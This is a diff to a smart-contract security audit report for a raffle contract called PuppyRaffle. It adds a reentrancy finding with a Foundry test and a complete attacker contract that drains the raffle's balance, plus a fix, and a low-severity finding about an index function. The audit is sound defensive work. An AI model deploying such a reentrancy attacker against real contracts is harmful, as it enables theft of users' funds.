@@ -36,21 +36,23 @@ Lead Security Researches:
 - [Disclaimer](#disclaimer)
 - [Risk Classification](#risk-classification)
 - [Audit Details](#audit-details)
-  - [Scope](#scope)
-  - [Roles](#roles)
+	- [Scope](#scope)
+	- [Roles](#roles)
 - [Executive Summary](#executive-summary)
-  - [Issues found](#issues-found)
+	- [Issues found](#issues-found)
 - [Findings](#findings)
-  - [High](#high)
-  - [Medium](#medium)
-  - [Low](#low)
-  - [Gas](#gas)
-    - [\[G-1\] Unchanged state variable should be declared constant or immutable.](#g-1-unchanged-state-variable-should-be-declared-constant-or-immutable)
-    - [\[G-2\] Storage variables in a loop should be cached.](#g-2-storage-variables-in-a-loop-should-be-cached)
-  - [Informational](#informational)
-    - [\[I-1\] Solidity pragma should be specific, not wide](#i-1-solidity-pragma-should-be-specific-not-wide)
-    - [\[I-2\] Using an outdated version of solidity is not recommended.](#i-2-using-an-outdated-version-of-solidity-is-not-recommended)
-    - [\[I-3\] Missing checks for `address(0)` when assigning values to address state variables](#i-3-missing-checks-for-address0-when-assigning-values-to-address-state-variables)
+	- [High](#high)
+		- [\[H-1\] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance.](#h-1-reentrancy-attack-in-puppyrafflerefund-allows-entrant-to-drain-raffle-balance)
+	- [Medium](#medium)
+	- [Low](#low)
+		- [\[L-1\] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle.](#l-1-puppyrafflegetactiveplayerindex-returns-0-for-non-existent-players-and-for-players-at-index-0-causing-a-player-at-index-0-to-incorrectly-think-they-have-not-entered-the-raffle)
+	- [Gas](#gas)
+		- [\[G-1\] Unchanged state variable should be declared constant or immutable.](#g-1-unchanged-state-variable-should-be-declared-constant-or-immutable)
+		- [\[G-2\] Storage variables in a loop should be cached.](#g-2-storage-variables-in-a-loop-should-be-cached)
+	- [Informational](#informational)
+		- [\[I-1\] Solidity pragma should be specific, not wide](#i-1-solidity-pragma-should-be-specific-not-wide)
+		- [\[I-2\] Using an outdated version of solidity is not recommended.](#i-2-using-an-outdated-version-of-solidity-is-not-recommended)
+		- [\[I-3\] Missing checks for `address(0)` when assigning values to address state variables](#i-3-missing-checks-for-address0-when-assigning-values-to-address-state-variables)
 
 # Protocol Summary
 
@@ -104,9 +106,172 @@ Commit Hash:
 
 ## High
 
+### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance.
+
+**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.
+
+In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call, we update the `PuppyRaffle::players`
+
+```js
+    function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+@>      payable(msg.sender).sendValue(entranceFee);
+@>      players[playerIndex] = address(0);
+
+        emit RaffleRefunded(playerAddress);
+    }
+```
+
+A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle till the contract balance is drained.
+
+**Impact:** All fees paid by raffle entrants could be stoken by the malicious participant.
+
+**Proof of Concept:**
+
+1. User enters the raffle.
+2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`.
+3. Attacker enters the raffle.
+4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.
+
+<details>
+<summary>Poc</summary>
+
+Place the following in `PuppyRaffleTest.t.sol`
+
+```js
+    function test_Reentrancy() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        uint256 raffleBalanceBefore = address(puppyRaffle).balance;
+
+        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
+
+        address attackUser = makeAddr("attackUser");
+        vm.deal(attackUser, 1 ether);
+
+        uint256 startingAttackContractBalance = address(attackerContract).balance;
+
+        vm.startPrank(attackUser);
+        attackerContract.attack{value: entranceFee}();
+        vm.stopPrank();
+        // attacker has entered the raffle.
+
+        uint256 endingAttackContractBalance = address(attackerContract).balance;
+        uint256 raffleBalanceAfterAttack = address(puppyRaffle).balance;
+
+        console.log("Starting attacker contract balance: ", startingAttackContractBalance);
+        console.log("Starting Raffle Balance", raffleBalanceBefore);
+
+        console.log("Ending attacker contract balance: ", endingAttackContractBalance);
+        console.log("Raffle Balance After Attack", raffleBalanceAfterAttack);
+
+        assertEq(endingAttackContractBalance, startingAttackContractBalance + 5 ether, "attackerContractBalance");
+        assertEq(raffleBalanceAfterAttack, 0);
+    }
+```
+
+And this contract as well
+
+```js
+	contract ReentrancyAttacker {
+        PuppyRaffle private immutable i_victimContract;
+        uint256 private immutable i_entranceFee;
+        uint256 private s_attackerIndex;
+
+        constructor(PuppyRaffle victimContract) {
+            i_victimContract = PuppyRaffle(victimContract);
+            i_entranceFee = victimContract.entranceFee();
+        }
+
+        function attack() external payable {
+            address[] memory players = new address[](1);
+            players[0] = address(this);
+            i_victimContract.enterRaffle{value: i_entranceFee}(players);
+
+            s_attackerIndex = i_victimContract.getActivePlayerIndex(address(this));
+            i_victimContract.refund(s_attackerIndex);
+        }
+
+        function _stealMoney() internal {
+            if (address(i_victimContract).balance > 0) {
+                i_victimContract.refund(s_attackerIndex);
+            }
+        }
+
+        receive() external payable {
+            _stealMoney();
+        }
+
+        fallback() external payable {
+            _stealMoney();
+        }
+    }
+```
+
+</details>
+
+**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.
+
+- By following the above steps we are statisfying CEI.
+
+```diff
+    function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
++       players[playerIndex] = address(0);
++       emit RaffleRefunded(playerAddress);
+
+       	payable(msg.sender).sendValue(entranceFee);
+
+-		players[playerIndex] = address(0);
+-       emit RaffleRefunded(playerAddress);
+    }
+```
+
+- Also, Reentrancy Guard from [Openzeppelin](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) can be used.
+
+
 ## Medium
 
 ## Low
+
+### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle.
+
+**Description:** If a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the natspec, it will also return 0 if the player is not in the array.
+
+```js
+@>	/// @return the index of the player in the array, if they are not active, it returns 0
+	function getActivePlayerIndex(address player) external view returns (uint256) {
+        for (uint256 i = 0; i < players.length; i++) {
+            if (players[i] == player) {
+                return i;
+            }
+        }
+@>      return 0;
+    }
+```
+
+**Impact:** A player at index 0 may incorrectly think they have not entered the raffle, and attempt to enter the raffle again, wasting gas.
+
+**Proof of Concept:**
+
+1. User enters the raffle, they are the first entrant.
+2. `PuppyRaffle::getActivePlayerIndex` returns 0.
+3. User thinks they have not entered correctly due to the function documentation.
+
+**Recommended Mitigation:** The easiest recommendation would be to revert if the player is not in the array instead of returning 0.
+
+You could also reserve the 0th position for any competition, but a better soultion might be to return an `int256` where the function returns `-1` if the player is not active.
 
 ## Gas
 
